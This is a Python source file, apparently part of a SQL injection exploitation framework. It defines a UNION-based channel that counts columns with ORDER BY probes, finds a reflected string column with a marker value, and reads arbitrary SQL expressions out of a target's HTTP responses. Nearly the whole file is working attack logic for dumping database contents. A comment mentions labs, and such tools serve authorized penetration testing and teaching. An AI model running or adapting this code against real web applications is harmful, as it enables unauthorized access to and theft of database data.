"""UNION-based channel: dump data directly in the response.

Detection:
  1. ORDER BY 1, 2, 3, ... until error -> N-1 is column count.
  2. UNION SELECT NULL,... -> find string column via marker.
  3. UNION SELECT <expr>,NULL,... -> read the expression.

The channel is *fast*: it reads a whole row in a single request,
unlike boolean/time which need log2(charset) * length requests.
"""

from __future__ import annotations

import re
from typing import Optional

from .base import Channel, ChannelInfo


NULL_MARKER = "xnlL7Mark3r"
MAX_ORDER_BY = 20


class UnionChannel(Channel):
    name = "union"

    def __init__(self, cfg, client, prober=None):
        super().__init__(cfg, client, prober)
        self.dialect: str = "mysql"
        self.prefix: str = ""
        self.suffix: str = ""
        self.cols_total: int = 0
        self.string_col: int = 0    # 1-based index of the string column
        self.marker: str = ""       # marker for detecting reflection
        self.order_ok: int = 0

    # -- configuration --------------------------------------------------

    def set_prefix_suffix(self, dialect: str, prefix: str, suffix: str,
                          marker: str = NULL_MARKER) -> None:
        """Set the injection prefix/suffix before detection."""
        self.dialect = dialect
        self.prefix = prefix
        self.suffix = suffix
        self.marker = marker

    def set_shape(self, cols_total: int, string_col: int) -> None:
        """Record the detected column count / string column index."""
        self.cols_total = cols_total
        self.string_col = string_col

    def configure(self, dialect: str, prefix: str, suffix: str,
                  cols_total: int = 0, string_col: int = 0,
                  marker: str = NULL_MARKER) -> None:
        """Legacy one-shot configure: sets both prefix/suffix and shape.

        For callers that already know cols_total/string_col. For detection
        workflows prefer set_prefix_suffix() + set_shape().
        """
        self.set_prefix_suffix(dialect, prefix, suffix, marker)
        if cols_total:
            self.set_shape(cols_total, string_col)

    def info(self) -> ChannelInfo:
        return ChannelInfo(
            name=self.name, dialect=self.dialect,
            prefix=self.prefix, suffix=self.suffix,
            technique="union",
            notes=f"cols={self.cols_total} string_col={self.string_col}",
        )

    # -- detection ------------------------------------------------------

    def detect(self) -> Optional[ChannelInfo]:
        """Try to detect a UNION-based injection on this target.

        Returns ChannelInfo on success, None otherwise.
        This is called by auto-discover after error/boolean/time.
        """
        if self.prober is None:
            return None

        # We need a prefix/suffix that already produces valid syntax.
        # Caller sets them via configure() before calling detect().
        if not self.prefix or not self.suffix:
            return None

        # 1) find column count via ORDER BY
        n = self._find_cols_order_by()
        if n <= 0:
            return None
        self.order_ok = n

        # 2) find a string column via UNION SELECT NULL,...,'marker',...
        col = self._find_string_col(n)
        if col <= 0:
            return None

        self.set_shape(n, col)
        return self.info()

    def _find_cols_order_by(self) -> int:
        """Return the number of columns, or 0 if ORDER BY fails."""
        last_ok = 0
        for n in range(1, MAX_ORDER_BY + 1):
            payload = f"{self.prefix} ORDER BY {n}{self.suffix}"
            try:
                r = self.prober.raw_send(payload)
                st = int(getattr(r, "status_code", 0))
                if st >= 500:
                    return last_ok
                # also try 1=1 vs 1=2 trick
                last_ok = n
            except Exception:
                return last_ok
        return last_ok

    def _find_string_col(self, n_cols: int) -> int:
        """Send UNION SELECT NULL,...,'marker',... and look for marker."""
        from ..http_client import body_of, status_of
        for i in range(1, n_cols + 1):
            cols = ["NULL"] * n_cols
            cols[i - 1] = f"'{self.marker}'"
            payload = (f"{self.prefix} UNION SELECT "
                       f"{','.join(cols)}{self.suffix}")
            try:
                r = self.prober.raw_send(payload)
                if status_of(r) >= 500:
                    continue
                if self.marker in body_of(r):
                    return i
            except Exception:
                continue
        return 0

    # -- probing --------------------------------------------------------

    def probe(self, condition: str) -> bool:
        """Not applicable for UNION: we can read directly."""
        raise NotImplementedError(
            "UnionChannel does not support boolean probe; use read_expr()"
        )

    def read_expr(self, expr: str) -> str:
        """Read an SQL expression as a string via UNION SELECT."""
        if self.cols_total <= 0 or self.string_col <= 0:
            return ""
        from ..http_client import body_of, status_of
        cols = ["NULL"] * self.cols_total
        cols[self.string_col - 1] = expr
        payload = (f"{self.prefix} UNION SELECT "
                   f"{','.join(cols)}{self.suffix}")
        try:
            r = self.prober.raw_send(payload)
            if status_of(r) >= 500:
                return ""
            return self._extract_between(body_of(r))
        except Exception:
            return ""

    def _extract_between(self, body: str) -> str:
        """Very rough extraction: return the first text line after marker."""
        # For labs we rely on the server rendering the string column
        # verbatim in the response.  We return the full body between
        # the first non-tag text and the next tag, capped at 200 chars.
        m = re.search(r">([^<>]{2,200})<", body)
        if m:
            return m.group(1).strip()
        return ""

    def extract_string(self, expr: str, length: int) -> str:
        return self.read_expr(expr)

    def extract_int(self, expr: str, hi: int = 100000, lo: int = 0) -> int:
        s = self.read_expr(expr)
        try:
            return int(s.strip())
        except Exception:
            return 0

    def _substr_fn(self) -> str:
        return "SUBSTR" if self.dialect == "oracle" else "SUBSTRING"

    def _ascii_fn(self) -> str:
        return "UNICODE" if self.dialect == "sqlite" else "ASCII"
